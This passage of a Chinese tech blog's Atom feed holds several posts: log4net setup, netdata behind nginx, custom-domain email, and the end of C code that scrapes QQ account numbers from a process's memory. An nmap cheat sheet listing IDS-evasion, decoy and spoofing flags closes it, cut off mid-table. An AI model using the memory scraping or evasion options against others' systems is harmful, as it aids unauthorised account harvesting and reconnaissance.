class="keyword">return</span>;</div><div class="line">					&#125;</div><div class="line">					<span class="comment">//去重复内存中的QQ</span></div><div class="line">					<span class="keyword">if</span> ( ! <span class="built_in">memcmp</span>( &amp; process_mem[j], GetQQKey , <span class="keyword">sizeof</span>(GetQQKey) ) )</div><div class="line">					&#123;</div><div class="line"></div><div class="line">						<span class="keyword">for</span> ( <span class="keyword">int</span>  k = j - <span class="number">1</span> ; k  &gt;  j - <span class="number">12</span> ; k -- )</div><div class="line">						&#123;</div><div class="line"></div><div class="line">							<span class="keyword">if</span> (process_mem[k]  &gt;=   <span class="string">'0'</span>   &amp;&amp;  process_mem[k]  &lt;=   <span class="string">'9'</span> )</div><div class="line">							&#123;</div><div class="line">								process_mem[k];</div><div class="line">								strqqlent[s] =process_mem[k];</div><div class="line">								s++;</div><div class="line">							&#125;</div><div class="line">							<span class="keyword">else</span>&#123;</div><div class="line">								<span class="keyword">break</span> ;</div><div class="line">							&#125;</div><div class="line"></div><div class="line">						&#125;</div><div class="line">					&#125;</div><div class="line">				&#125;</div><div class="line">			&#125;</div><div class="line"></div><div class="line"></div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;进程抓取QQ号码&quot;&gt;&lt;a href=&quot;#进程抓取QQ号码&quot; class=&quot;headerlink&quot; title=&quot;进程抓取QQ号码&quot;&gt;&lt;/a&gt;进程抓取QQ号码&lt;/h2&gt;&lt;p&gt;前天翻硬盘的时候，不知道什么时候写的一个C语言版本的通过进程抓取内存关键后面的QQ号码&lt;br
+    
+    </summary>
+    
+      <category term="学习" scheme="https://www.sysblz.com/categories/learn/"/>
+    
+    
+      <category term="学习" scheme="https://www.sysblz.com/tags/Learn/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>无配置文件log4Net</title>
+    <link href="https://www.sysblz.com/article/4214199755.html"/>
+    <id>https://www.sysblz.com/article/4214199755.html</id>
+    <published>2017-12-16T18:22:00.000Z</published>
+    <updated>2017-12-16T18:22:00.000Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="代码配置log4net"><a href="#代码配置log4net" class="headerlink" title="代码配置log4net"></a>代码配置log4net</h2><p>主要简单的项目不想写配置文件，所以研究了一下不需要配置文件下配置long4net写日志。<br>主要是配置文件写配置直接上代码，也以防我自己忘记记录一下.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line">  private  Hierarchy _hierarchy = null;</div><div class="line">private  ILoggerRepository _repostitory =null;</div><div class="line">private PatternLayout _patternLayout = null;</div><div class="line">private Logger _logger = null;</div><div class="line"></div><div class="line">  var repostitorys = LogManager.GetAllRepositories();</div><div class="line">	foreach (var loggrepostitory in repostitorys)</div><div class="line">	&#123;</div><div class="line">		if (!loggrepostitory.Name.Equals(RepositoriesName)) continue;</div><div class="line">		_repostitory = loggrepostitory;</div><div class="line">		break;</div><div class="line">	&#125;</div><div class="line">	if (_repostitory == null)</div><div class="line">	&#123;</div><div class="line">		//1.创建Repositorie2.获取默认</div><div class="line">		_repostitory = LogManager.CreateRepository(RepositoriesName);</div><div class="line">		//_repostitory = LogManager.GetRepository(Assembly.GetEntryAssembly());</div><div class="line">	&#125;</div><div class="line">	_hierarchy = (Hierarchy)_repostitory;</div><div class="line"></div><div class="line">    SetPatternLayout();</div><div class="line">    RollingFileAppender fileAppender = new RollingFileAppender</div><div class="line">	&#123;</div><div class="line">		Name = LoggerName,</div><div class="line">		Layout = _patternLayout,</div><div class="line">		File = base.FileAppenderFile,</div><div class="line">		AppendToFile = true,</div><div class="line">		MaxSizeRollBackups = 10,</div><div class="line">		MaxFileSize = 100,</div><div class="line">		RollingStyle = RollingFileAppender.RollingMode.Date,</div><div class="line">		DatePattern = &quot;yyyyMMdd&quot;</div><div class="line">	&#125;;</div><div class="line">	fileAppender.AddFilter(SetLevelRangeFilter());</div><div class="line">	fileAppender.ActivateOptions();</div><div class="line">    _hierarchy.Root.Level = _hierarchy.LevelMap[&quot;ALL&quot;];</div><div class="line">	_hierarchy.Root.AddAppender(appender);</div><div class="line">    BasicConfigurator.Configure(_repostitory);</div></pre></td></tr></table></figure>
+<h5 id="输出格式方法"><a href="#输出格式方法" class="headerlink" title="输出格式方法"></a>输出格式方法</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">  /// &lt;summary&gt;</div><div class="line">/// 设置layout输出格式</div><div class="line">/// &lt;/summary&gt;</div><div class="line">private void SetPatternLayout()</div><div class="line">&#123;</div><div class="line"></div><div class="line">	_patternLayout = new PatternLayout &#123;ConversionPattern = base.ConversionPattern&#125;;</div><div class="line">	_patternLayout.ActivateOptions();</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h5 id="过滤日志级别"><a href="#过滤日志级别" class="headerlink" title="过滤日志级别"></a>过滤日志级别</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">  /// &lt;summary&gt;</div><div class="line">/// 设置日志过滤输出级别</div><div class="line">/// &lt;/summary&gt;</div><div class="line">/// &lt;returns&gt;&lt;/returns&gt;</div><div class="line">private LevelRangeFilter SetLevelRangeFilter()</div><div class="line">&#123;</div><div class="line">	var levelrangefilter = new LevelRangeFilter();</div><div class="line">	var map = (_hierarchy ==null)? LogManager.GetRepository().LevelMap:_hierarchy.LevelMap;</div><div class="line">	levelrangefilter.LevelMax = map[base.LevelMax];</div><div class="line">	levelrangefilter.LevelMin = map[base.LevelMin];</div><div class="line">	return levelrangefilter;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>基本上就这些，如果你还有配置数据库或者其他的参照官网日志配置<br>官网配置示范<a href="https://logging.apache.org/log4net/release/config-examples.html" rel="external nofollow noopener noreferrer" target="_blank">链接</a><br>这里放一下我的<a href="https://github.com/StreetWind/WindRat/blob/master/Wind.Common/log4Net.cs" rel="external nofollow noopener noreferrer" target="_blank">日志帮助类</a></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;代码配置log4net&quot;&gt;&lt;a href=&quot;#代码配置log4net&quot; class=&quot;headerlink&quot; title=&quot;代码配置log4net&quot;&gt;&lt;/a&gt;代码配置log4net&lt;/h2&gt;&lt;p&gt;主要简单的项目不想写配置文件，所以研究了一下不需要配置文件下配置lo
+    
+    </summary>
+    
+      <category term="学习" scheme="https://www.sysblz.com/categories/learn/"/>
+    
+    
+      <category term="学习" scheme="https://www.sysblz.com/tags/Learn/"/>
+    
+      <category term="C#" scheme="https://www.sysblz.com/tags/C/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Linux系统监控工具netdata</title>
+    <link href="https://www.sysblz.com/article/4205683256.html"/>
+    <id>https://www.sysblz.com/article/4205683256.html</id>
+    <published>2017-12-09T20:57:00.000Z</published>
+    <updated>2017-12-09T20:57:00.000Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="Linux系统监控工具"><a href="#Linux系统监控工具" class="headerlink" title="Linux系统监控工具"></a>Linux系统监控工具</h2><p>今天推荐一个好看的监控工具netdata,大家可以看看我家的树莓派监控我已经放公网了<a href="https://rpi.sysblz.com" rel="external nofollow noopener noreferrer" target="_blank">自己树莓派</a>先上图</p>
+<p><img src="https://ws1.sinaimg.cn/large/006VAXiDgy1fmatlb4v7bj31fu0pxwk2.jpg" alt=""></p>
+<h3 id="下载安装"><a href="#下载安装" class="headerlink" title="下载安装"></a>下载安装</h3><p>下载地址<a href="https://github.com/firehol/netdata" rel="external nofollow noopener noreferrer" target="_blank">项目地址</a><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">git <span class="built_in">clone</span> https://github.com/firehol/netdata.git</div><div class="line"><span class="built_in">cd</span> netdata</div><div class="line">sudo ./netdata-install</div></pre></td></tr></table></figure></p>
+<h3 id="配置外网访问"><a href="#配置外网访问" class="headerlink" title="配置外网访问"></a>配置外网访问</h3><p>nginx这个安装我就不多说了，不会自己查nmp一件安装脚本一堆，不想脚本安装一个命令就安装了</p>
+<h3 id="nginx配置"><a href="#nginx配置" class="headerlink" title="nginx配置"></a>nginx配置</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">vim /etc/nginx/nginx.conf</div></pre></td></tr></table></figure>
+<p>我的配置文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">#均衡负载</div><div class="line">upstream brckend &#123;</div><div class="line">	server 127.0.0.1:19999;</div><div class="line">	keepalive 1024;</div><div class="line">&#125;</div><div class="line"></div><div class="line">server &#123;</div><div class="line">#https配置我删了需要知道怎么开启https自己查或者留言问我</div><div class="line">#这下面是http配置</div><div class="line">    listen 80;</div><div class="line">    server_name www.xxx.com;</div><div class="line">    location / &#123;</div><div class="line">        proxy_set_header X-Forwarded-Server $host;</div><div class="line">        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</div><div class="line">        proxy_set_header Connection &quot;keep-alive&quot;;</div><div class="line">        proxy_set_header Host $http_host;</div><div class="line">        proxy_pass http://brckend;</div><div class="line">        proxy_http_version 1.1;</div><div class="line">        proxy_pass_request_headers on;</div><div class="line">        proxy_store off;</div><div class="line">        gzip on;</div><div class="line">        gzip_proxied any;</div><div class="line">        gzip_types *;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    #预防攻击</div><div class="line">    if ($http_user_agent ~* &quot;WordPress&quot;) &#123;</div><div class="line">      return 403;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    if ($request_method !~ ^(GET|HEAD|OPTIONS)$ )&#123;</div><div class="line">      return 403;</div><div class="line">    &#125;</div><div class="line">    #禁止爬虫</div><div class="line">    if ($http_user_agent ~* &quot;Baiduspider|Googlebot|Googlebot-Mobile|Googlebot-Image|Sogou spider|Sogou web spider&quot;)</div><div class="line">    &#123;</div><div class="line">      return 403;</div><div class="line">    &#125;</div></pre></td></tr></table></figure>
+<h3 id="netdata配置"><a href="#netdata配置" class="headerlink" title="netdata配置"></a>netdata配置</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">vim /etc/netdata/netdata.conf</div><div class="line"></div><div class="line"><span class="comment">#配置文件中在global下面添加这些</span></div><div class="line">[global]</div><div class="line">    <span class="built_in">bind</span> socket to IP = 127.0.0.1</div><div class="line">    access <span class="built_in">log</span> = none</div><div class="line">    disconnect idle web clients after seconds = 3600</div><div class="line">    <span class="built_in">enable</span> web responses gzip compression = no</div></pre></td></tr></table></figure>
+<h3 id="增加打开的文件限制"><a href="#增加打开的文件限制" class="headerlink" title="增加打开的文件限制"></a>增加打开的文件限制</h3><p>这里系统分是否是systemd类型，想基于Debian系列发布版本的都不是systemd像基于RPM发布版本都是systemd如</p>
+<h4 id="不是systemd"><a href="#不是systemd" class="headerlink" title="不是systemd"></a>不是systemd</h4><p>给这两个文件添加内容</p>
+<ol>
+<li><p>/etc/security/limits.d/nginx.conf</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">nginx   soft    nofile  10000</div><div class="line">nginx   hard    nofile  30000</div></pre></td></tr></table></figure>
+</li>
+<li><p>/etc/security/limits.d/netdata.conf</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">netdata   soft    nofile  10000</div><div class="line">netdata   hard    nofile  30000</div></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>刷新系统<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sysctl -p</div></pre></td></tr></table></figure></p>
+<h4 id="是systemd系统"><a href="#是systemd系统" class="headerlink" title="是systemd系统"></a>是systemd系统</h4><p>创建两个文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mkdir -p /etc/systemd/system/netdata.service.d</div><div class="line">mkdir -p /etc/systemd/system/nginx.service.d</div></pre></td></tr></table></figure></p>
+<p>像这两个文件添加内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">[Service]</div><div class="line">LimitNOFILE=30000</div></pre></td></tr></table></figure></p>
+<p>启动服务<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">systemctl daemon-reload</div><div class="line">systemctl restart netdata.service</div><div class="line">systemctl restart nginx.service</div></pre></td></tr></table></figure></p>
+<p>检查是否有效<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">cat /proc/$(ps aux | grep &quot;nginx: master process&quot; | grep -v grep | awk &apos;&#123;print $2&#125;&apos;)/limits | grep &quot;Max open files&quot;</div><div class="line">cat /proc/$(ps aux | grep &quot;netdata&quot; | head -n1 | grep -v grep | awk &apos;&#123;print $2&#125;&apos;)/limits | grep &quot;Max open files&quot;</div></pre></td></tr></table></figure></p>
+<h4 id="配置nginx统计插件"><a href="#配置nginx统计插件" class="headerlink" title="配置nginx统计插件"></a>配置nginx统计插件</h4><p>niginx 配置文件下配置</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">location /stub_status</div><div class="line">	    &#123;</div><div class="line">        	stub_status on;</div><div class="line">	        access_log off;</div><div class="line">	        #allow 127.0.0.1;</div><div class="line">	        #deny all;</div><div class="line">	    &#125;</div></pre></td></tr></table></figure>
+<p>如果配置指定域名连接那更改这个文件</p>
+<ol>
+<li>/etc/netdata/python.d/nginx.conf</li>
+</ol>
+<p>url地址改成你的域名如图<br><img src="https://ws1.sinaimg.cn/large/006VAXiDgy1fmb15ylfwuj30g507kt8u.jpg" alt=""></p>
+<h3 id="配置web日志"><a href="#配置web日志" class="headerlink" title="配置web日志"></a>配置web日志</h3><p>日志很简单只是没有权限而已<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">chmod 775 /var/log/nginx/access.log</div></pre></td></tr></table></figure></p>
+<p>如果你自定义类日志文件请去下面文件更改</p>
+<ol>
+<li>/etc/netdata/python.d/web_log.conf</li>
+</ol>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;Linux系统监控工具&quot;&gt;&lt;a href=&quot;#Linux系统监控工具&quot; class=&quot;headerlink&quot; title=&quot;Linux系统监控工具&quot;&gt;&lt;/a&gt;Linux系统监控工具&lt;/h2&gt;&lt;p&gt;今天推荐一个好看的监控工具netdata,大家可以看看我家的树莓派监
+    
+    </summary>
+    
+      <category term="Linux" scheme="https://www.sysblz.com/categories/Linux/"/>
+    
+    
+      <category term="Linux" scheme="https://www.sysblz.com/tags/Linux/"/>
+    
+      <category term="工具" scheme="https://www.sysblz.com/tags/tools/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>自定义域名企业邮箱配置</title>
+    <link href="https://www.sysblz.com/article/231249583.html"/>
+    <id>https://www.sysblz.com/article/231249583.html</id>
+    <published>2017-12-08T08:56:00.000Z</published>
+    <updated>2017-12-08T21:56:00.000Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="自定义域名企业邮箱配置"><a href="#自定义域名企业邮箱配置" class="headerlink" title="自定义域名企业邮箱配置"></a>自定义域名企业邮箱配置</h2><blockquote>
+<p>  因为，我有自己的域名就想用自己的域名做邮箱。结果国内腾讯，阿里之类的免费企业邮箱自定义域名现在都要备案。<br>我域名没有备案搜索了一圈国外企业邮箱<a href="https://www.zoho.com/mail/" rel="external nofollow noopener noreferrer" target="_blank">zoho</a>,和<a href="https://mail.yandex.com/" rel="external nofollow noopener noreferrer" target="_blank">YandexMail</a></p>
+<h3 id="YandexMail邮箱"><a href="#YandexMail邮箱" class="headerlink" title="YandexMail邮箱"></a>YandexMail邮箱</h3><p> YandexMail邮箱支持自定义域名，是俄罗斯最大搜索引擎公司提供的。<br> 优点：</p>
+<ol>
+<li>支持1000个自定义用户</li>
+<li>每个用户10G空间</li>
+<li>支持POP3,IMAP,SMTP协议客服端</li>
+</ol>
+</blockquote>
+<p> 缺点：<br> 1.Foxmail发送失败s收件无问题<br> 用来几天感觉没有太大问题，我用win10自带邮件系统。<br> <img src="https://ws1.sinaimg.cn/large/006VAXiDgy1fm94qr1ia5j30vq0acq38.jpg" alt=""></p>
+<h4 id="验证域名"><a href="#验证域名" class="headerlink" title="验证域名"></a>验证域名</h4><p> 地址：<a href="https://domain.yandex.com/domains_add/" rel="external nofollow noopener noreferrer" target="_blank">验证地址</a><br> <img src="https://ws1.sinaimg.cn/large/006VAXiDgy1fm97imgiatj30y50dhmyt.jpg" alt=""></p>
+<p> 如果未注册，会弹出注册,按照步骤严重域名所有权添加MX记录</p>
+<h4 id="添加邮件用户"><a href="#添加邮件用户" class="headerlink" title="添加邮件用户"></a>添加邮件用户</h4><p> <img src="https://ws1.sinaimg.cn/large/006VAXiDgy1fm97vb79jwj311r0afgnb.jpg" alt=""></p>
+<p> 注意DNS配置，如果你不把域名提交给他管理要自己去更改MX,TXT记录</p>
+<h3 id="修改DNS记录"><a href="#修改DNS记录" class="headerlink" title="修改DNS记录"></a>修改DNS记录</h3><p> <img src="https://ws1.sinaimg.cn/large/006VAXiDgy1fm97z8kh45j30u80mpq4z.jpg" alt=""></p>
+<p> 注意TXT记录一定要添加不然你的邮件可能被其他邮件公司认为是垃圾邮件</p>
+<h3 id="IMAP，POP3，SMTP-地址"><a href="#IMAP，POP3，SMTP-地址" class="headerlink" title="IMAP，POP3，SMTP 地址"></a>IMAP，POP3，SMTP 地址</h3><table>
+<thead>
+<tr>
+<th>协议</th>
+<th>地址</th>
+<th>SSL</th>
+<th>端口</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>IMAP</td>
+<td>imap.yandex.com</td>
+<td>YES</td>
+<td>993</td>
+</tr>
+<tr>
+<td>POP3</td>
+<td>pop.yandex.com</td>
+<td>YES</td>
+<td>995</td>
+</tr>
+<tr>
+<td>SMTP</td>
+<td>smtp.yandex.com</td>
+<td>YES</td>
+<td>465</td>
+</tr>
+</tbody>
+</table>
+<h3 id="zoho"><a href="#zoho" class="headerlink" title="zoho"></a>zoho</h3><p><a href="https://workplace.zoho.com/orgsignup.do?plan=free" rel="external nofollow noopener noreferrer" target="_blank">注册地址</a><br>优点：</p>
+<ol>
+<li>支持25个自定义用户+25推荐后获得的用户</li>
+<li>每个用户20G的空间</li>
+<li>支持最多20M附件</li>
+<li>支持smtp发送信件</li>
+</ol>
+<p>缺点：</p>
+<ol>
+<li>免费用户不支持IMAP,POP3</li>
+</ol>
+<p><img src="https://ws1.sinaimg.cn/large/006VAXiDgy1fm94ocpkq9j31590do40i.jpg" alt=""></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;自定义域名企业邮箱配置&quot;&gt;&lt;a href=&quot;#自定义域名企业邮箱配置&quot; class=&quot;headerlink&quot; title=&quot;自定义域名企业邮箱配置&quot;&gt;&lt;/a&gt;自定义域名企业邮箱配置&lt;/h2&gt;&lt;blockquote&gt;
+&lt;p&gt;  因为，我有自己的域名就想用自己的域名做
+    
+    </summary>
+    
+      <category term="其他" scheme="https://www.sysblz.com/categories/other/"/>
+    
+    
+      <category term="其他" scheme="https://www.sysblz.com/tags/other/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>nmap 常用命令速查</title>
+    <link href="https://www.sysblz.com/article/7914343816.html"/>
+    <id>https://www.sysblz.com/article/7914343816.html</id>
+    <published>2017-11-30T14:47:00.000Z</published>
+    <updated>2019-03-30T11:36:13.302Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="nmap-常用参数"><a href="#nmap-常用参数" class="headerlink" title="nmap 常用参数"></a>nmap 常用参数</h2><h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">-sL                     仅仅是显示,扫描的IP,不会进行任何扫描(域名解析IP之类)</div><div class="line">-sn                     ping扫描,即主机发现</div><div class="line">-Pn                     不检测主机存活</div><div class="line">-PS/PA/PU/PY[portlist]  TCP SYN Ping/TCP ACK Ping/UDP Ping发现</div><div class="line">-PE/PP/PM               使用ICMP <span class="built_in">echo</span>, timestamp and netmask 请求包发现主机</div><div class="line">-PO[prococol list]      使用IP协议包探测对方主机是否开启</div><div class="line">-n/-R                   不对IP进行域名反向解析/为所有的IP都进行域名的反响解析</div></pre></td></tr></table></figure>
+<h3 id="扫描技术"><a href="#扫描技术" class="headerlink" title="扫描技术"></a>扫描技术</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">-sS/sT/sA/sW/sM                 TCP SYN/TCP connect()/ACK/TCP窗口扫描/TCP Maimon扫描</div><div class="line">-sU                             UDP扫描</div><div class="line">-sN/sF/sX                       TCP Null，FIN，and Xmas扫描</div><div class="line">--scanflags                     自定义TCP包中的flags</div><div class="line">-sI zombie host[:probeport]     高级僵尸扫描([参照](https://nmap.org/book/idlescan.html))</div><div class="line">-sY/sZ                          SCTP INIT/COOKIE-ECHO 扫描</div><div class="line">-sO                             使用IP protocol 扫描确定目标机支持的协议类型</div><div class="line">-b “FTP relay host”             使用FTP bounce scan</div></pre></td></tr></table></figure>
+<h3 id="指定端口和端口扫描顺序"><a href="#指定端口和端口扫描顺序" class="headerlink" title="指定端口和端口扫描顺序"></a>指定端口和端口扫描顺序</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">-p                      特定的端口 -p 80,443 或者 -p 1-65535 全端口扫描 或者 -p T:80 U:8081 扫描TCP 80端口和UDP 8081端口</div><div class="line">-F                      快速扫描模式,比默认的扫描端口还少</div><div class="line">-r                      不随机扫描端口,默认是随机扫描的</div><div class="line">--top-ports <span class="string">"number"</span>    扫描开放概率最高的number个端口,出现的概率需要参考nmap-services文件,ubuntu中该文件位于/usr/share/nmap.nmap默认扫前1000个</div><div class="line">--port-ratio <span class="string">"ratio"</span>    扫描指定频率以上的端口</div></pre></td></tr></table></figure>
+<h3 id="服务和版本探测"><a href="#服务和版本探测" class="headerlink" title="服务和版本探测"></a>服务和版本探测</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">-sV                             开放版本探测,可以直接使用-A同时打开操作系统探测和版本探测</div><div class="line">--version-intensity <span class="string">"level"</span>     设置版本扫描强度,强度水平说明了应该使用哪些探测报文。数值越高，服务越有可能被正确识别。默认是7</div><div class="line">--version-light                 打开轻量级模式,为--version-intensity 2的别名</div><div class="line">--version-all                   尝试所有探测,为--version-intensity 9的别名</div><div class="line">--version-trace                 显示出详细的版本侦测过程信息</div><div class="line">-sR                             RPC扫描-sR很少被需要</div></pre></td></tr></table></figure>
+<h3 id="系统识别"><a href="#系统识别" class="headerlink" title="系统识别"></a>系统识别</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">-O              启用操作系统检测,-A来同时启用操作系统检测和版本检测</div><div class="line">--osscan-limit  针对指定的目标进行操作系统检测(至少需确知该主机分别有一个open和closed的端口)</div><div class="line">--osscan-guess  推测操作系统检测结果,当Nmap无法确定所检测的操作系统时，会尽可能地提供最相近的匹配，Nmap默认进行这种匹配</div></pre></td></tr></table></figure>
+<h3 id="时间和性能"><a href="#时间和性能" class="headerlink" title="时间和性能"></a>时间和性能</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">-T                                                                  设置时间模板-T0-5 paranoid (0)、sneaky (1)、polite (2)、normal(3)默认模式、 aggressive (4)延时10ms和insane (5)延时5ms</div><div class="line">--min-hostgroup &lt;milliseconds&gt;; --max-hostgroup &lt;milliseconds&gt;      调整并行扫描组大小 min-hostgroup默认5 </div><div class="line">--min-parallelism &lt;milliseconds&gt;; --max-parallelism &lt;milliseconds&gt;  调整探测报文的并行度</div><div class="line">--min-rtt-timeout ， --max-rtt-timeout ， --initial-rtt-timeout     调整探测报文超时已毫秒为单位</div><div class="line">--host-timeout &lt;milliseconds&gt;                                       放弃低速目标主机</div><div class="line">--scan-delay &lt;milliseconds&gt;; --max-scan-delay &lt;milliseconds&gt;        调整探测报文的时间间隔</div></pre></td></tr></table></figure>
+<h3 id="防火墙-IDS躲避和哄骗"><a href="#防火墙-IDS躲避和哄骗" class="headerlink" title="防火墙/IDS躲避和哄骗"></a>防火墙/IDS躲避和哄骗</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">-f; --mtu value                 指定使用分片、指定数据包的MTU.</div><div class="line">-D decoy1,decoy2,ME             使用诱饵隐蔽扫描</div><div class="line">-S IP-ADDRESS                   源地址欺骗</div><div class="line">-e interface                    使用指定的接口</div><div class="line">-g/ --<span class="built_in">source</span>-port PROTNUM       使用指定源端口</div><div class="line">--proxies url1,[url2],...       使用HTTP或者SOCKS4的代理</div><div class="line"></div><div class="line">--data-length NUM               填充随机数据让数据包长度达到NUM</div><div class="line">--ip-options OPTIONS            使用指定的IP选项来发送数据包</div><div class="line">--ttl VALUE                     设置IP time-to-live域</div><div class="line">--spoof-mac ADDR/PREFIX/VEBDOR  MAC地址伪装</div><div class="line">--badsum                        使用错误的checksum来发送数据包</div></pre></td></tr></table></figure>
+<h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">-oN                     将标准输出直接写入指定的文件</div><div class="line">-oX                     输出xml文件</div><div class="line">-oS                     将所有的输出都改为大写</div><div class="line">-oG                     输出便于通过bash或者perl处理的格式,非xml</div><div class="line">-oA BASENAME            可将扫描结果以标准格式、XML格式和Grep格式一次性输出</div><div class="line">-v                      提高输出信息的详细度</div><div class="line">-d level                设置debug级别,最高是9</div><div class="line">--reason                显示端口处于带确认状态的原因</div><div class="line">--open                  只输出端口状态为open的端口</div><div class="line">--packet-trace          显示所有发送或者接收到的数据包</div><div class="line">--iflist                显示路由信息和接口,便于调试</div><div class="line">--<span class="built_in">log</span>-errors            把日志等级为errors/warings的日志输出</div><div class="line">--append-output         